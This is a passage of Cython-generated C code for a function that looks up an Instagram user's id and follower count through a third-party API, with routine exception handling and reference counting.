  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 658, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 658, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_user_agent, __pyx_t_3) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_headers = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_requests); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 662, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 662, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      
      __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 663, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_api_ig_storiesig_info_api, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 663, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      
      __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 662, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 664, __pyx_L3_error)

      
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, __pyx_t_4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 662, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 664, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_rrr = __pyx_t_1;
      __pyx_t_1 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_9) {
      __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_4, &__pyx_t_8) < 0) __PYX_ERR(0, 665, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_4);
      __pyx_v_e = __pyx_t_4;
      /*try:*/ {

        
        __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 666, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_XDECREF_SET(__pyx_v_rrr, __pyx_t_3);
        __pyx_t_3 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L15;
        }
        __pyx_L14_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_12 = 0; __pyx_t_13 = 0; __pyx_t_14 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_15, &__pyx_t_16, &__pyx_t_17);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_12, &__pyx_t_13, &__pyx_t_14) < 0)) __Pyx_ErrFetch(&__pyx_t_12, &__pyx_t_13, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_12);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_17);
          __pyx_t_9 = __pyx_lineno; __pyx_t_10 = __pyx_clineno; __pyx_t_11 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_ExceptionReset(__pyx_t_15, __pyx_t_16, __pyx_t_17);
          }
          __Pyx_XGIVEREF(__pyx_t_12);
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ErrRestore(__pyx_t_12, __pyx_t_13, __pyx_t_14);
          __pyx_t_12 = 0; __pyx_t_13 = 0; __pyx_t_14 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0;
          __pyx_lineno = __pyx_t_9; __pyx_clineno = __pyx_t_10; __pyx_filename = __pyx_t_11;
          goto __pyx_L5_except_error;
        }
        __pyx_L15:;
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    __pyx_L8_try_end:;
  }

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rrr, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_result, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_result, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  {
    __pyx_t_18 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    if (__pyx_t_2) {
      __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_t_2); __pyx_t_2 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_n_u_result);
    PyTuple_SET_ITEM(__pyx_t_18, 0+__pyx_t_10, __pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_18, 1+__pyx_t_10, __pyx_t_3);
    __pyx_t_3 = 0;
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_18, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_18 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_18)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_18);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_user, __pyx_t_4};
    __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_user, __pyx_t_4};
    __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  {
    __pyx_t_3 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (__pyx_t_18) {
      __Pyx_GIVEREF(__pyx_t_18); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_18); __pyx_t_18 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_n_u_user);
    PyTuple_SET_ITEM(__pyx_t_3, 0+__pyx_t_10, __pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_10, __pyx_t_4);
    __pyx_t_4 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 668, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__48, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_Id = __pyx_t_8;
  __pyx_t_8 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_rrr, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_18 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_18)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_18);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_result, __pyx_t_4};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_result, __pyx_t_4};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  {
    __pyx_t_2 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (__pyx_t_18) {
      __Pyx_GIVEREF(__pyx_t_18); PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_18); __pyx_t_18 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_n_u_result);
    PyTuple_SET_ITEM(__pyx_t_2, 0+__pyx_t_10, __pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_2, 1+__pyx_t_10, __pyx_t_4);
    __pyx_t_4 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_user, __pyx_t_1};
    __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_user, __pyx_t_1};
    __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  } else
  #endif
  {
    __pyx_t_4 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (__pyx_t_2) {
      __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_2); __pyx_t_2 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_n_u_user);
    PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_10, __pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_10, __pyx_t_1);
    __pyx_t_1 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_4, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_fows = __pyx_t_8;
  __pyx_t_8 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_rrr, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_result, __pyx_t_1};
    __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_result, __pyx_t_1};
    __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  } else
  #endif
  {
    __pyx_t_18 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    if (__pyx_t_2) {
      __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_t_2); __pyx_t_2 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_n_u_result);
    PyTuple_SET_ITEM(__pyx_t_18, 0+__pyx_t_10, __pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_18, 1+__pyx_t_10, __pyx_t_1);
    __pyx_t_1 = 0;
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_18, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_18 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_18)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_18);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_user, __pyx_t_3};
    __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_user, __pyx_t_3};
    __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  {
    __pyx_t_1 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    if (__pyx_t_18) {
      __Pyx_GIVEREF(__pyx_t_18); PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_18); __pyx_t_18 = NULL;
    }
